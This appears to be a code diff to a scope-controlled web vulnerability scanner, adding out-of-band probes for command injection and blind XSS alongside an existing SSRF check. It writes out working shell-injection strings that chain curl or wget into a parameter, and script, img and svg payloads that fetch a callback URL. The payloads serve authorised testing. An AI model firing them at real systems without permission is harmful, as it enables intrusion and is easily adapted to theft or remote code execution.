@@ -138,47 +138,122 @@ _SSRF_HINT = re.compile(
     re.I)
 
 
-def ssrf_oob(points: list[Point], lab: LabContext, canary: OOBCanary,
-             *, wait_timeout: float = 3.0) -> list[Finding]:
-    """Blind-SSRF probe: inject a unique OOB callback URL into URL-ish params and
-    confirm ONLY if the target actually fetches it (a recorded canary hit).
+def _oob_probe(points: list[Point], lab: LabContext, canary: OOBCanary, *,
+               purpose: str, payloads_for, title: str, detail: str,
+               severity: Severity, label: str, param_hint=None,
+               wait_timeout: float = 3.0) -> list[Finding]:
+    """Shared out-of-band probe loop (SSRF / RCE / blind-XSS differ only in payload).
 
-    The proof is deterministic and independent of the response the target returns —
-    a hit means something on the target's side made an outbound request to a URL we
-    minted, which is exactly what SSRF is. Runs through LabContext.send (scope,
-    caps, rate-limit, attestation, kill-switch, audit); the canary URL is benign
-    (a plain GET target that just records the hit). `wait_timeout` bounds how long
-    to wait for a (possibly slightly delayed) server-side fetch per probe."""
+    For each candidate param: mint one canary token, send every payload variant
+    embedding its callback URL, then wait once. A recorded hit is *deterministic*
+    proof the injected value reached a sink that made an outbound request — the same
+    independent-corroboration bar the response-based verifiers hold. Every send goes
+    through LabContext.send (scope/caps/rate-limit/attestation/kill-switch/audit) and
+    each payload only ever causes a benign GET to the operator's own canary."""
     out: list[Finding] = []
     for pt in points:
         for param in pt.param_names():
-            if not _SSRF_HINT.search(param):
+            if param_hint is not None and not param_hint.search(param):
                 continue
             ok, _why = lab.can_send()
             if not ok:
                 return out
             token = canary.new_token()
-            payload = canary.url_for(token)
-            _send_with(pt, param, payload, lab, "ssrf-oob")
+            url = canary.url_for(token)
+            for payload in payloads_for(url, pt.params.get(param)):
+                ok, _why = lab.can_send()
+                if not ok:
+                    break
+                _send_with(pt, param, payload, lab, purpose)
             if not canary.wait_for_hit(token, timeout=wait_timeout):
                 continue
             src = (canary.hits(token)[0].src_ip if canary.hits(token) else "?")
-            out.append(_confirm(
-                "Blind SSRF confirmed (out-of-band callback)", Severity.HIGH,
-                pt, param, payload,
-                "The server made an outbound request to a unique attacker-controlled "
-                "URL injected into this parameter — proving server-side request "
-                "forgery. Reachable internal services / cloud metadata may be exposed.",
-                f"canary callback received from {src}"))
+            out.append(_confirm(title, severity, pt, param, label, detail,
+                                f"out-of-band callback received from {src}"))
     return out
+
+
+def ssrf_oob(points: list[Point], lab: LabContext, canary: OOBCanary,
+             *, wait_timeout: float = 3.0) -> list[Finding]:
+    """Blind-SSRF probe: inject a unique OOB callback URL into URL-ish params and
+    confirm ONLY if the target actually fetches it (a recorded canary hit)."""
+    return _oob_probe(
+        points, lab, canary, purpose="ssrf-oob", param_hint=_SSRF_HINT,
+        payloads_for=lambda url, _base: [url],
+        title="Blind SSRF confirmed (out-of-band callback)", severity=Severity.HIGH,
+        label="oob-canary-url",
+        detail="The server made an outbound request to a unique attacker-controlled "
+               "URL injected into this parameter — proving server-side request forgery. "
+               "Reachable internal services / cloud metadata may be exposed.",
+        wait_timeout=wait_timeout)
+
+
+def _rce_payloads(url: str, base) -> list[str]:
+    b = str(base) if base else "1"
+    fetch = f"curl -s {url}"           # only ever GETs the operator's canary — benign
+    wget = f"wget -qO- {url}"          # fallback for hosts without curl
+    return [f"{b};{fetch}", f"{b}|{fetch}", f"{b}&&{fetch}",
+            f"$({fetch})", f"`{fetch}`", f"{b};{wget}"]
+
+
+def command_injection_oob(points: list[Point], lab: LabContext, canary: OOBCanary,
+                          *, wait_timeout: float = 3.0) -> list[Finding]:
+    """OS command-injection probe: inject shell payloads that make the host fetch a
+    unique canary URL. A callback is deterministic proof the value reached a shell —
+    i.e. remote command execution. Payloads are benign (they only run `curl`/`wget`
+    against the operator's canary; nothing is read, written, or destroyed)."""
+    return _oob_probe(
+        points, lab, canary, purpose="rce-oob", param_hint=None,
+        payloads_for=_rce_payloads,
+        title="OS command injection confirmed (out-of-band callback)",
+        severity=Severity.CRITICAL, label="oob-shell-callback",
+        detail="A shell command-substitution payload injected into this parameter "
+               "caused the host to make an outbound request to a unique canary URL — "
+               "proving remote command execution.",
+        wait_timeout=wait_timeout)
+
+
+def _xss_payloads(url: str, _base) -> list[str]:
+    return [f'<script src="{url}"></script>',
+            f'"><script src="{url}"></script>',
+            f'<img src="{url}">',
+            f'"><img src=x onerror="fetch(\'{url}\')">',
+            f"<svg onload=\"fetch('{url}')\">"]
+
+
+def blind_xss_oob(points: list[Point], lab: LabContext, canary: OOBCanary,
+                  *, wait_timeout: float = 3.0) -> list[Finding]:
+    """Blind/stored-XSS beacon: inject markup that loads a unique canary resource.
+    A callback proves the value was rendered into an HTML/JS context that fetched
+    it — stored XSS, or server-side rendering/preview of the injected markup.
+
+    Honest scope: execution in a *victim's* browser is asynchronous and won't fire
+    during the scan window; this confirms the synchronous cases (server-side render,
+    immediate reflection) and plants a beacon the canary keeps recording."""
+    return _oob_probe(
+        points, lab, canary, purpose="blind-xss-oob", param_hint=None,
+        payloads_for=_xss_payloads,
+        title="HTML/script injection confirmed (out-of-band beacon fired)",
+        severity=Severity.HIGH, label="oob-xss-beacon",
+        detail="Injected markup loaded a unique canary resource, proving the value "
+               "was rendered into an HTML/JS context that fetched it (stored/blind XSS "
+               "or server-side render of attacker markup).",
+        wait_timeout=wait_timeout)
+
+
+# Maps a config/CLI OOB probe name to its verifier — the plugin runs the enabled
+# subset under one shared canary.
+OOB_PROBES = {
+    "ssrf": ssrf_oob,
+    "rce": command_injection_oob,
+    "blind-xss": blind_xss_oob,
+}
 
 
 def run_ssrf_oob(points: list[Point], lab: LabContext, *,
                  host: str | None = None, bind: str = "127.0.0.1",
                  port: int = 0) -> list[Finding]:
-    """Convenience wrapper that owns the canary lifecycle. `host` is the address the
-    target should call back to (a LAN/public IP the target can route to); it
-    defaults to the bind address, which only works when the target is local."""
+    """Convenience wrapper that owns the canary lifecycle (used in tests/tools)."""
     with OOBCanary(host=host or bind, bind=bind, port=port) as canary:
         return ssrf_oob(points, lab, canary)
 
